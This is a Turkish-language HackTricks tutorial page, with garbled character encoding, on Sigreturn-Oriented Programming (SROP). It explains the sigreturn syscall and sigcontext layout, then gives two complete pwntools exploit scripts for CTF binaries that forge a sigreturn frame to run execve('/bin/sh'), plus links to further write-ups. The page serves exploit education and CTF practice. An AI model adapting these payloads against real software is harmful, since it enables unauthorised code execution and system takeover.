# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

**`Sigreturn`**, bir sinyal iÅŸleyicisinin yÃ¼rÃ¼tmesini tamamladÄ±ktan sonra temizlemek iÃ§in kullanÄ±lan Ã¶zel bir **syscall**'dÄ±r. Sinyaller, bir programÄ±n iÅŸletim sistemi tarafÄ±ndan gÃ¶nderilen kesintilerdir ve genellikle olaÄŸanÃ¼stÃ¼ bir durumun meydana geldiÄŸini belirtmek iÃ§in kullanÄ±lÄ±r. Bir program bir sinyal aldÄ±ÄŸÄ±nda, sinyali iÅŸlemek iÃ§in geÃ§ici olarak mevcut iÅŸini durdurur ve sinyalleri ele almak iÃ§in tasarlanmÄ±ÅŸ Ã¶zel bir iÅŸlev olan **sinyal iÅŸleyici** ile sinyali iÅŸler.

Sinyal iÅŸleyici tamamlandÄ±ktan sonra, programÄ±n **Ã¶nceki durumuna devam etmesi** gerekir, sanki hiÃ§bir ÅŸey olmamÄ±ÅŸ gibi. Ä°ÅŸte bu noktada **`sigreturn`** devreye girer. ProgramÄ±n **sinyal iÅŸleyicisinden dÃ¶nmesine** yardÄ±mcÄ± olur ve sinyal iÅŸleyici tarafÄ±ndan kullanÄ±lan yÄ±ÄŸÄ±n Ã§erÃ§evesini (iÅŸlev Ã§aÄŸrÄ±larÄ±nÄ± ve yerel deÄŸiÅŸkenleri depolayan bellek bÃ¶lÃ¼mÃ¼) temizleyerek programÄ±n durumunu geri yÃ¼kler.

Ä°lginÃ§ olan, **`sigreturn`**'Ä±n programÄ±n durumunu nasÄ±l geri yÃ¼klediÄŸidir: bunu **CPU'nun tÃ¼m kayÄ±t deÄŸerlerini yÄ±ÄŸÄ±nda depolayarak** yapar. Sinyal artÄ±k engellenmediÄŸinde, **`sigreturn` bu deÄŸerleri yÄ±ÄŸÄ±ndan Ã§Ä±karÄ±r**, bÃ¶ylece CPU'nun kayÄ±tlarÄ±nÄ± sinyal iÅŸlenmeden Ã¶nceki durumuna sÄ±fÄ±rlar. Bu, yÄ±ÄŸÄ±nÄ±n mevcut Ã¼st kÄ±smÄ±nÄ± gÃ¶steren yÄ±ÄŸÄ±n iÅŸaretÃ§i kaydÄ± (RSP) dahil olmak Ã¼zere tÃ¼m kayÄ±tlarÄ± iÃ§erir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** syscall'Ä±nÄ± Ã§aÄŸÄ±rarak ve **yÃ¼klemek istediÄŸimiz kayÄ±t deÄŸerlerini** **yÄ±ÄŸÄ±na** ekleyerek, tÃ¼m kayÄ±t deÄŸerlerini **kontrol etmek** ve dolayÄ±sÄ±yla Ã¶rneÄŸin `execve` syscall'Ä±nÄ± `/bin/sh` ile **Ã§aÄŸÄ±rmak** mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

Bu durumun, diÄŸer Ret2syscall'larÄ± Ã§aÄŸÄ±rmak iÃ§in parametreleri kontrol etmeyi Ã§ok daha kolay hale getiren bir **Ret2syscall tÃ¼rÃ¼** olduÄŸunu unutmayÄ±n:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

EÄŸer merak ediyorsanÄ±z, bu daha sonra deÄŸerleri geri almak iÃ§in yÄ±ÄŸÄ±nda depolanan **sigcontext yapÄ±sÄ±dÄ±r** (ÅŸemasÄ± [**buradan**](https://guyinatuxedo.github.io/16-srop/backdoor_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Daha iyi bir aÃ§Ä±klama iÃ§in ayrÄ±ca kontrol edin:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Ã–rnek

[**Burada bir Ã¶rnek bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) burada signeturn Ã§aÄŸrÄ±sÄ± ROP aracÄ±lÄ±ÄŸÄ±yla oluÅŸturulmuÅŸtur (rxa'ya `0xf` deÄŸeri konulmuÅŸtur), ancak buradan itibaren bu son istismar:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
AyrÄ±ca [**buradan istismarÄ± kontrol edin**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) burada ikili dosya zaten `sigreturn` Ã§aÄŸrÄ±yordu ve bu nedenle bununla bir **ROP** inÅŸa etmek gerekmez:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## DiÄŸer Ã–rnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **YÄ±ÄŸÄ±ta yazma** ve ardÄ±ndan **`sigreturn`** syscall'ini Ã§aÄŸÄ±ran bir assembly ikili dosyasÄ±. YÄ±ÄŸÄ±ta bir [**ret2syscall**](../rop-syscall-execv/) yazmak ve ikilinin belleÄŸindeki bayraÄŸÄ± okumak mÃ¼mkÃ¼ndÃ¼r.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **YÄ±ÄŸÄ±ta yazma** ve ardÄ±ndan **`sigreturn`** syscall'ini Ã§aÄŸÄ±ran bir assembly ikili dosyasÄ±. YÄ±ÄŸÄ±ta bir [**ret2syscall**](../rop-syscall-execv/) yazmak mÃ¼mkÃ¼ndÃ¼r (ikili dosya `/bin/sh` dizesine sahiptir).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bit, relro yok, canary yok, nx, pie yok. `gets` fonksiyonunu kÃ¶tÃ¼ye kullanarak basit bir buffer overflow. [**ret2syscall**](../rop-syscall-execv/) gerÃ§ekleÅŸtiren gadget eksikliÄŸi. ROP zinciri, tekrar `gets` Ã§aÄŸrÄ±sÄ± yaparak `/bin/sh`'yi `.bss`'ye yazar, `eax`'Ä± `0xf` olarak ayarlamak iÃ§in **`alarm`** fonksiyonunu kÃ¶tÃ¼ye kullanÄ±r ve bir **SROP** Ã§aÄŸÄ±rarak bir shell Ã§alÄ±ÅŸtÄ±rÄ±r.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bit assembly programÄ±, relro yok, canary yok, nx, pie yok. AkÄ±ÅŸ, yÄ±ÄŸÄ±ta yazma, birkaÃ§ kaydÄ± kontrol etme ve bir syscall Ã§aÄŸÄ±rma imkanÄ± saÄŸlar ve ardÄ±ndan `exit` Ã§aÄŸrÄ±lÄ±r. SeÃ§ilen syscall, kayÄ±tlarÄ± ayarlayacak ve `eip`'yi Ã¶nceki syscall talimatÄ±nÄ± Ã§aÄŸÄ±rmak iÃ§in hareket ettirecek bir `sigreturn`'dÄ±r ve ikili alanÄ± `rwx` olarak ayarlamak iÃ§in `memprotect` Ã§aÄŸrÄ±sÄ± yapar ve ESP'yi ikili alanda ayarlar. AkÄ±ÅŸÄ± takip ederek, program tekrar ESP'ye okuma yapacak, ancak bu durumda ESP bir sonraki talimata iÅŸaret edecektir, bÃ¶ylece bir shellcode geÃ§erek onu bir sonraki talimat olarak yazacak ve Ã§alÄ±ÅŸtÄ±racaktÄ±r.
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP, bir shellcode'un yerleÅŸtirildiÄŸi yere yÃ¼rÃ¼tme ayrÄ±calÄ±klarÄ± (memprotect) vermek iÃ§in kullanÄ±lÄ±r.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
